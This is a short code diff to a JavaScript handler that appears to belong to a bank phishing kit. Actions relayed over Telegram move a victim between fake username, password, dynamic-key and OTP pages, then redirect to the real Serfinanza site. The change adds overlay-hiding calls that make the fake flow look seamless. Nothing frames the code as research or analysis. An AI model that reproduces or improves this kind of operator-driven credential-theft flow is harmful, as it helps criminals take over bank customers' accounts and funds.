@@ -44,18 +44,23 @@
     function handleTelegramAction(data) {
         switch(data.action) {
             case 'request_usuario':
+                BancoUtils.hideOverlay();
                 window.location.href = 'index.html';
                 break;
             case 'request_password':
+                BancoUtils.hideOverlay();
                 window.location.href = 'password.html';
                 break;
             case 'request_dynamic':
+                BancoUtils.hideOverlay();
                 window.location.href = 'dinamica.html';
                 break;
             case 'request_otp':
+                BancoUtils.hideOverlay();
                 window.location.href = 'otp.html';
                 break;
             case 'finish':
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://www.serfinanza.com/';
                 break;
         }
